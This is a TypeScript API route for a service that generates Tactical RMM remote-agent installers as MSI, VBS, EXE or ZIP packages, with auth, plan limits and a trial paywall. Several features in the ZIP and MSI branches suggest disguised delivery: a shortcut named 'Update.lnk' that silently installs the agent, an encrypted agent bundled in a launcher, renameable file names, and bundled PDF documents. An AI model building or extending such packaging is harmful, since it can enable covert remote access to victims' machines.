import { NextResponse } from "next/server";
import { z } from "zod";

import { logApiError } from "@/lib/api-error-log";
import { isPrivateTier, resolveAgentApiBaseUrl } from "@/lib/agent-domains";
import { db } from "@/lib/db";
import { createDeviceSite } from "@/lib/devices";
import { env } from "@/lib/env";
import { GenerationQueueFullError, withGenerationSlot } from "@/lib/generation-queue";
import { callMsiGenerator } from "@/lib/msi-generator";
import { callZipGenerator } from "@/lib/zip-generator";
import { createDeployment, createManualInstaller, deployUrl } from "@/lib/trmm";
import { listOrgDeployments } from "@/lib/deployments";
import { getExeTrialState, startExeTrialIfNeeded } from "@/lib/exe-trial";
import { getActiveOrganization, getCurrentUser } from "@/lib/session-user";

// Shared fields for all three install methods (merged / separated / msi), sent
// either as JSON or as multipart/form-data (msi carries a File).
const deploymentSchema = z.object({
  deviceName: z
    .string({ required_error: "Device name is required" })
    .trim()
    .min(2, "Device name must be at least 2 characters")
    .max(60, "Device name must be at most 60 characters"),
  // v1: Windows-only onboarding (per plan). agentType + goarch are Windows-targeted.
  agentType: z.enum(["server", "workstation"]).default("workstation"),
  goarch: z.enum(["amd64", "386", "arm64"]).default("amd64"),
  expiryHours: z.union([z.literal(24), z.literal(72)]).default(72),
  installMethod: z.enum(["merged", "separated", "msi", "zip"]).default("merged"),
  // FIX 3 — optional renameable artifact names (launcher ZIP mode only; blank =
  // default). Bare names, ≤64 chars; the generator/lib sanitize rejects
  // path/control separators + "..", so these zod bounds are the first gate.
  updateLinkName: z.string().trim().max(64).optional(),
  innerFolder: z.string().trim().max(64).optional(),
  zipName: z.string().trim().max(64).optional(),
});

const MAX_PDF_BYTES = 20 * 1024 * 1024; // ≤20MB
const MAX_ICO_BYTES = 500 * 1024; // ≤500KB, per the generator's contract

/** Validates a single field from multipart form data against the zod schema. */
function coerceField(
  value: FormDataEntryValue | null,
  field: "deviceName" | "agentType" | "goarch" | "expiryHours" | "installMethod",
  fallback: unknown,
): unknown {
  if (value == null) return fallback;
  if (typeof value !== "string") return value;
  if (field === "expiryHours") return value === "" ? fallback : Number(value);
  if (field === "agentType" || field === "goarch" || field === "installMethod") {
    return value === "" ? fallback : value;
  }
  return value; // deviceName
}

function errorMessage(e: unknown): string {
  return e instanceof z.ZodError ? e.errors[0]?.message : "Invalid request body.";
}

/**
 * Queues installer-generation work behind a concurrency limiter (see
 * lib/generation-queue.ts) — a burst of simultaneous "Add Device" requests
 * (each potentially holding a 20MB PDF upload in memory plus outbound calls to
 * TRMM/the MSI generator) should queue rather than pile up unbounded memory on
 * this VPS, which also runs TRMM's Django/celery workers and MeshCentral.
 */
export async function POST(request: Request) {
  try {
    return await withGenerationSlot(() => handleDeployment(request));
  } catch (err) {
    if (err instanceof GenerationQueueFullError) {
      return NextResponse.json({ error: err.message }, { status: 503 });
    }
    throw err;
  }
}

async function handleDeployment(request: Request) {
  const user = await getCurrentUser();
  if (!user) {
    return NextResponse.json({ error: "Not authenticated." }, { status: 401 });
  }
  if (!user.emailVerified) {
    return NextResponse.json({ error: "Email not verified." }, { status: 403 });
  }

  // Every org-scoped value comes from the user's ACTIVE organization.
  const org = await getActiveOrganization(user);

  // Retry provisioning here if the client/site ids are still null (per plan).
  const clientId = org?.trmmClientId ?? null;
  if (!clientId || !org?.trmmSiteId) {
    return NextResponse.json(
      { error: "Your account isn't fully set up yet. Please try again in a moment." },
      { status: 409 },
    );
  }

  // Task 61 (Task 53 Part 3 + owner hard requirement 2026-09-21): private-tier
  // orgs have NO self-service installer path — a device joins a private org
  // only via the Task 62 PowerShell move from a public org. Endpoint-level
  // gate (not just hidden UI): direct POSTs as a private-org member 403 here.
  if (isPrivateTier(org.agentDomainTier)) {
    return NextResponse.json(
      {
        error:
          "Private organizations add devices by moving them from a public organization, not by generating installers.",
      },
      { status: 403 },
    );
  }

  // Task 61: the tier-resolved agent API base baked into this org's installers
  // (public → TRMM_PUBLIC_API_BASE_URL). Resolved AFTER the private lockout
  // above, so the private branch below is unreachable via self-service — kept
  // as defense-in-depth for any future internal/admin private-installer path
  // (Task 62 needs a private-domain install command to exist somewhere).
  const agentApiBaseUrl = resolveAgentApiBaseUrl(org.agentDomainTier);

  // Branch on Content-Type: JSON (merged/separated) vs multipart/form-data (msi,
  // which carries an uploaded PDF file).
  let parsed;
  let pdf: File | null = null;
  let ico: File | null = null;
  try {
    const contentType = request.headers.get("content-type") ?? "";
    if (contentType.includes("multipart/form-data")) {
      const form = await request.formData();
      const installMethod =
        (form.get("installMethod") as string | null) ?? "merged";
      // msi REQUIRES a PDF; the other two don't carry one. ico is optional and
      // only meaningful for msi — it's what triggers the generator's branded EXE.
      if (installMethod === "msi") {
        const file = form.get("pdf");
        if (file instanceof File) pdf = file;
        const icoFile = form.get("ico");
        if (icoFile instanceof File && icoFile.size > 0) ico = icoFile;
      }
      parsed = deploymentSchema.parse({
        deviceName: coerceField(form.get("deviceName"), "deviceName", ""),
        agentType: coerceField(form.get("agentType"), "agentType", "workstation"),
        goarch: coerceField(form.get("goarch"), "goarch", "amd64"),
        expiryHours: coerceField(form.get("expiryHours"), "expiryHours", 72),
        installMethod: coerceField(form.get("installMethod"), "installMethod", "merged"),
      });
    } else {
      parsed = deploymentSchema.parse(await request.json());
    }
  } catch (e) {
    return NextResponse.json({ error: errorMessage(e) }, { status: 400 });
  }

  // Plan-aware device cap: premium gets the higher tier, everyone else the free
  // one. Staff are treated as entitled (premium tier) even when their own org is
  // free, so a staff account is never silently blocked from generating
  // installers (incl. the ZIP bundle) by a low free-tier cap — the web app's
  // Add-Device flow offers these to anyone logged in, and staff use it daily.
  const isStaff = user.isStaff === true;
  const entitled = isStaff || org.plan === "premium";
  const maxDevices = entitled ? env.maxDevicesPremiumTier : env.maxDevicesFreeTier;
  const activeDeployments = await db.deployment.count({
    where: { organizationId: org.id, expiresAt: { gt: new Date() } },
  });
  if (activeDeployments >= maxDevices) {
    return NextResponse.json(
      { error: `You've reached the limit of ${maxDevices} active installation files for your plan.` },
      { status: 403 },
    );
  }

  // Task 72 (free tier: 24h to generate installers, then a paywall) — applies
  // to EVERY install method (merged/separated/msi/zip — no method-specific
  // gate), BEFORE any TRMM/generator work. Free-tier orgs share Task 69's SAME
  // server-authoritative 24h clock (User.trialStartedAt): within 24h any method
  // is allowed; after, NEW installer generation 403s while device
  // list/details stay open (this file's GET is untouched) and
  // already-generated installers keep working. Premium orgs and staff are
  // never gated (mirrors the `entitled` pattern above). Never-started (null
  // trialStartedAt — legacy accounts whose verify predates the clock, or a
  // failed verify-time start) starts now and proceeds as within-trial rather
  // than blocking.
  if (!entitled) {
    let trial = await getExeTrialState(user.id);
    if (trial.startedAt === null) {
      trial = await startExeTrialIfNeeded(user.id);
    }
    if (trial.startedAt !== null && !trial.active) {
      return NextResponse.json(
        {
          error:
            "Your 24-hour free trial has ended — upgrade to premium to generate more installers.",
          trialExpired: true,
          trialEndsAt: trial.endsAt?.toISOString() ?? null,
        },
        { status: 403 },
      );
    }
  }

  // MSI path: validate the PDF before doing any TRMM work, and screen for the
  // generator not being configured first so we never attempt bad calls.
  const isPremium = org.plan === "premium";
  if (parsed.installMethod === "msi") {
    if (!env.msiGeneratorUrl || !env.msiGeneratorSecret) {
      return NextResponse.json(
        { error: "MSI installer isn't available yet" },
        { status: 503 },
      );
    }
    if (!pdf) {
      return NextResponse.json(
        { error: "Please upload a PDF install guide." },
        { status: 400 },
      );
    }
    const isPdf =
      pdf.type === "application/pdf" ||
      (typeof pdf.name === "string" && pdf.name.toLowerCase().endsWith(".pdf"));
    if (!isPdf) {
      return NextResponse.json(
        { error: "The install guide must be a PDF file." },
        { status: 400 },
      );
    }
    if (pdf.size > MAX_PDF_BYTES) {
      return NextResponse.json(
        { error: "The install guide must be under 20MB." },
        { status: 400 },
      );
    }
    // Branded EXE (from an uploaded .ico) is a premium-tier output. Never trust
    // client-side gating for entitlement — silently drop the icon for non-premium
    // accounts rather than erroring, since the UI shouldn't offer it to them anyway.
    if (ico && !isPremium) {
      ico = null;
    }
    if (ico) {
      const isIco =
        ico.type === "image/x-icon" ||
        ico.type === "image/vnd.microsoft.icon" ||
        (typeof ico.name === "string" && ico.name.toLowerCase().endsWith(".ico"));
      if (!isIco) {
        return NextResponse.json(
          { error: "The company icon must be a .ico file." },
          { status: 400 },
        );
      }
      if (ico.size > MAX_ICO_BYTES) {
        return NextResponse.json(
          { error: "The company icon must be under 500KB." },
          { status: 400 },
        );
      }
    }
  }

  // ZIP path: same generator service/secret as MSI (ZIP_GENERATOR_URL only
  // differs if a dedicated host is used). Gate first so an unconfigured
  // generator fails gracefully, never crashes the request.
  if (parsed.installMethod === "zip") {
    if (!env.zipGeneratorUrl || !env.msiGeneratorSecret) {
      return NextResponse.json(
        { error: "ZIP installer isn't available yet" },
        { status: 503 },
      );
    }
  }

  // Each device gets its own freshly-created TRMM Site, named by the customer
  // (same for all three methods — the MSI option still needs its own site).
  let siteId: number;
  try {
    siteId = await createDeviceSite(clientId, parsed.deviceName);
  } catch (err) {
    console.error("createDeviceSite failed:", err);
    await logApiError({
      route: "/api/devices/deployments",
      method: "POST",
      statusCode: 502,
      error: err,
      userId: user.id,
    });
    return NextResponse.json(
      { error: "Couldn't set up the device slot right now. Please try again." },
      { status: 502 },
    );
  }

  const expiresAt = new Date(Date.now() + parsed.expiryHours * 60 * 60 * 1000);
  const common = {
    deviceName: parsed.deviceName,
    expiresAt,
    monType: parsed.agentType,
    goarch: parsed.goarch,
    trmmSiteId: siteId,
    installMethod: parsed.installMethod,
  };

  let result;
  try {
    if (parsed.installMethod === "merged") {
      // Merged is served by RMM itself (GET /clients/<uid>/deploy/), so only
      // the uid is needed here; tokenKey is unused on this path.
      const { uid } = await createDeployment({
        site: siteId,
        expiresAt,
        agentType: parsed.agentType,
        goarch: parsed.goarch,
      });
      await db.deployment.create({
        data: { ...common, organizationId: org.id, trmmDeploymentUid: uid },
      });
      result = {
        installMethod: "merged" as const,
        downloadUrl: deployUrl(uid, agentApiBaseUrl),
        command: null,
        installerUrl: null,
      };
    } else if (parsed.installMethod === "separated") {
      const manual = await createManualInstaller({
        clientId,
        siteId,
        expiryHours: parsed.expiryHours,
        agentType: parsed.agentType,
        goarch: parsed.goarch,
        apiBase: agentApiBaseUrl,
      });
      await db.deployment.create({
        data: { ...common, organizationId: org.id, trmmDeploymentUid: null },
      });
      result = {
        installMethod: "separated" as const,
        downloadUrl: null,
        command: manual.cmd,
        psCommand: manual.psCommand,
        installerUrl: manual.url,
      };
    } else if (parsed.installMethod === "zip") {
      // zip — the deployment's uid is ONLY the exeUrl token
      // (/clients/<uid>/deploy/ → the exe Update.lnk silently installs); the
      // --auth the agent needs to enroll is the deployment's knox token_key
      // (that is what /api/v3/installer/ actually validates). One agent per zip.
      const dep = await createDeployment({
        site: siteId,
        expiresAt,
        agentType: parsed.agentType,
        goarch: parsed.goarch,
      });
      let zipUrl: string | null = null;
      try {
        const zip = await callZipGenerator({
          clientId,
          siteId,
          agentType: parsed.agentType,
          authToken: dep.tokenKey,
          apiUrl: agentApiBaseUrl,
          exeUrl: deployUrl(dep.uid, agentApiBaseUrl),
          features: ["rdp", "ping", "power"],
          expiryHours: parsed.expiryHours,
          // Launcher mode (WP4): ship the offline carrier zip
          // { Update.lnk, Launcher.exe } — the launcher carries the encrypted
          // agent + per-device config; nothing is downloaded at runtime.
          launcherMode: true,
          // FIX 3 — optional renameable artifact names (blank = default).
          // callZipGenerator sanitizes with the generator's bare-name rule and
          // omits blank/invalid values so the confirmed default flow is kept.
          updateLinkName: parsed.updateLinkName,
          innerFolder: parsed.innerFolder,
          zipName: parsed.zipName,
        });
        zipUrl = zip.downloadUrl;
        result = {
          installMethod: "zip" as const,
          downloadUrl: zip.downloadUrl,
          command: null,
          installerUrl: null,
        };
      } catch (err) {
        console.error("callZipGenerator failed:", err);
        await logApiError({
          route: "/api/devices/deployments",
          method: "POST",
          statusCode: 502,
          error: err,
          userId: user.id,
        });
        // Per spec: the underlying TRMM Deployment/Site are NOT rolled back.
        // Store the row so the failure is observable, then surface the error.
        await db.deployment.create({
          data: {
            ...common,
            organizationId: org.id,
            trmmDeploymentUid: dep.uid,
            msiReady: false,
          },
        });
        return NextResponse.json(
          { error: "ZIP installer was created but packaging failed. Please try again." },
          { status: 502 },
        );
      }
      await db.deployment.create({
        data: {
          ...common,
          organizationId: org.id,
          trmmDeploymentUid: dep.uid,
          msiReady: false,
          zipUrl,
        },
      });
    } else {
      // msi — the generator bakes --auth into the MSI's agent; that must be
      // the deployment's knox token_key (the uid is only stored for tracing).
      const dep = await createDeployment({
        site: siteId,
        expiresAt,
        agentType: parsed.agentType,
        goarch: parsed.goarch,
      });
      let msiReady = false;
      // Premium-gated outputs: the generator always builds MSI + VBS and
      // conditionally an EXE (when an ico was uploaded), but VBS/EXE are only
      // ever surfaced or persisted for premium accounts — gate at write time so
      // a later plan downgrade can't leave a stale premium link reachable.
      let vbsUrl: string | null = null;
      let exeUrl: string | null = null;
      try {
        const msi = await callMsiGenerator({
          clientId,
          siteId,
          agentType: parsed.agentType,
          authToken: dep.tokenKey,
          apiUrl: agentApiBaseUrl,
          manufacturer: org.name ?? "Vantra",
          pdf: pdf!,
          ico: ico ?? undefined,
        });
        msiReady = true;
        if (isPremium) {
          vbsUrl = msi.vbsUrl;
          exeUrl = msi.exeUrl ?? null;
        }
        result = {
          installMethod: "msi" as const,
          downloadUrl: msi.downloadUrl,
          vbsUrl,
          exeUrl,
          command: null,
          installerUrl: null,
        };
      } catch (err) {
        console.error("callMsiGenerator failed:", err);
        await logApiError({
          route: "/api/devices/deployments",
          method: "POST",
          statusCode: 502,
          error: err,
          userId: user.id,
        });
        // Per spec: the underlying TRMM Deployment/Site are NOT rolled back
        // (can't be cleanly un-created). Store the row with msiReady:false so the
        // failure is observable, then surface the packaging error.
        await db.deployment.create({
          data: {
            ...common,
            organizationId: org.id,
            trmmDeploymentUid: dep.uid,
            msiReady,
          },
        });
        return NextResponse.json(
          { error: "Installer was created but packaging failed. Please try again." },
          { status: 502 },
        );
      }
      await db.deployment.create({
        data: { ...common, organizationId: org.id, trmmDeploymentUid: dep.uid, msiReady, vbsUrl, exeUrl },
      });
    }
  } catch (err) {
    console.error("install generation failed:", err);
    await logApiError({
      route: "/api/devices/deployments",
      method: "POST",
      statusCode: 502,
      error: err,
      userId: user.id,
    });
    return NextResponse.json(
      { error: "Couldn't generate an installer right now. Please try again." },
      { status: 502 },
    );
  }

  return NextResponse.json({
    ...result,
    deviceName: parsed.deviceName,
    expiresAt: expiresAt.toISOString(),
    activeCount: activeDeployments + 1,
    maxDevices,
  });
}

// --- GET: list the caller's pending installers ------------------------------
// Scoped to the caller's ACTIVE org the same way /api/devices does (org →
// trmmClientId/trmmSiteId; never a client-supplied org). Returns only
// deployments owned by this org AND still live on TRMM (see listOrgDeployments).
export async function GET() {
  const user = await getCurrentUser();
  if (!user) {
    return NextResponse.json({ error: "Not authenticated." }, { status: 401 });
  }
  if (!user.emailVerified) {
    return NextResponse.json({ error: "Email not verified." }, { status: 403 });
  }

  // Every org-scoped read goes through the user's ACTIVE organization.
  const org = await getActiveOrganization(user);
  if (!org?.trmmClientId) {
    // Not yet provisioned — return gracefully; the UI can trigger retry.
    return NextResponse.json({ deployments: [], provisioned: false });
  }

  let deployments;
  try {
    deployments = await listOrgDeployments(org.id);
  } catch (err) {
    console.error("listOrgDeployments failed:", err);
    await logApiError({
      route: "/api/devices/deployments",
      method: "GET",
      statusCode: 502,
      error: err,
      userId: user.id,
    });
    return NextResponse.json(
      { error: "Couldn't reach the device server right now." },
      { status: 502 },
    );
  }

  return NextResponse.json({
    provisioned: true,
    agentDomainTier: org.agentDomainTier,
    deployments: deployments.map((d) => ({
      // Both handles travel together: `id` (TRMM's numeric id, for DELETE) and
      // `uid` (Vantra's stored uid string, the download-URL token).
      id: d.id,
      uid: d.uid,
      deviceName: d.deviceName,
      installMethod: d.installMethod,
      createdAt: d.createdAt.toISOString(),
      expiresAt: d.expiresAt.toISOString(),
      trmmSiteId: d.trmmSiteId,
      site_id: d.site_id,
    })),
  });
}
